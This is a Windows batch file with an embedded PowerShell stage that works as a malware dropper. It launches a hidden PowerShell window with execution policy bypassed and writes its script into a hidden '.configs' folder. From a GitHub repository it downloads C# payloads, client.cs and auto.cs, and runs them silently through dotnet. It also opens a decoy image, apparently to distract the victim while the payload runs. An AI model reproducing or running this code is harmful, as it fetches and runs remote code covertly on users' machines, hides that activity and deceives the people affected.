@echo off
setlocal
set "CFG=%USERPROFILE%\.configs"

if not exist "%CFG%" mkdir "%CFG%"
if exist "%CFG%\pp.ps1" attrib -h "%CFG%\pp.ps1" >nul 2>&1

start "" powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$l=Get-Content -LiteralPath '%~f0'; $s=-1; for($i=0;$i -lt $l.Count;$i++){if($l[$i].Trim() -eq 'REM ====PS1===='){$s=$i+1;break}}; if($s -lt 0){exit 1}; $body=($l[$s..($l.Count-1)] -join [Environment]::NewLine); [IO.File]::WriteAllText('%CFG%\pp.ps1',$body,(New-Object System.Text.UTF8Encoding $false)); & '%CFG%\pp.ps1'"

exit
endlocal

REM ====PS1====
# ============================================
# pp.ps1 - download, hide, execute (FIXED)
# ============================================

$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$configPath = Join-Path $env:USERPROFILE ".configs"
if (-not (Test-Path -Path $configPath)) {
    New-Item -Path $configPath -ItemType Directory -Force | Out-Null
}


$d = Get-Item -LiteralPath $configPath -Force
$d.Attributes = $d.Attributes -bor [System.IO.FileAttributes]::Hidden


function Save-HiddenFile {
    param([string]$Url, [string]$Path)
    if (Test-Path -LiteralPath $Path) {
        try { (Get-Item -LiteralPath $Path -Force).Attributes = 'Normal' } catch {}
    }
    Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -ErrorAction Stop
    $f = Get-Item -LiteralPath $Path -Force
    $f.Attributes = $f.Attributes -bor [System.IO.FileAttributes]::Hidden
}

# ---- 1. pypy.py (source = client.cs) ----
$finalPath = Join-Path $configPath "client.cs"

Save-HiddenFile -Url "https://raw.githubusercontent.com/rahul-call/inner/main/ror/client.cs" -Path $finalPath


# ---- 2. auto.cs ----
$finalPath3 = Join-Path $configPath "auto.cs"

Save-HiddenFile -Url "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.cs" -Path $finalPath3

# ---- 3. boss.jpg  (DISABLED - uncomment below to re-enable) ----
$finalPath2 = Join-Path $configPath "boss.jpg"

Save-HiddenFile -Url "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHpvfIYHGkZ6M9dOr1K7hSRGgvADhQ2U0FHyj6qJ5Lb5CAKJSO1NQGvhxm&s=10" -Path $finalPath2


# ---- 5. Launch (single process) ----

Push-Location -LiteralPath $configPath

Start-Process -FilePath 'dotnet' -ArgumentList @('run', 'auto.cs', '--', 'client.cs', '--hidden') -WindowStyle Hidden

# ---- 6. Open decoy image (via visible temp copy) ----
if (Test-Path -LiteralPath $finalPath2) {
    $tempImg = Join-Path $env:TEMP ("boss_" + [Guid]::NewGuid().ToString('N') + ".jpg")
    Copy-Item -LiteralPath $finalPath2 -Destination $tempImg -Force
    Start-Process -FilePath $tempImg
    # clean up the temp copy in 60s (image viewer keeps the file open while shown)
    Start-Job -ScriptBlock {
        Start-Sleep -Seconds 60
        Remove-Item -LiteralPath $using:tempImg -Force -ErrorAction SilentlyContinue
    } | Out-Null
}
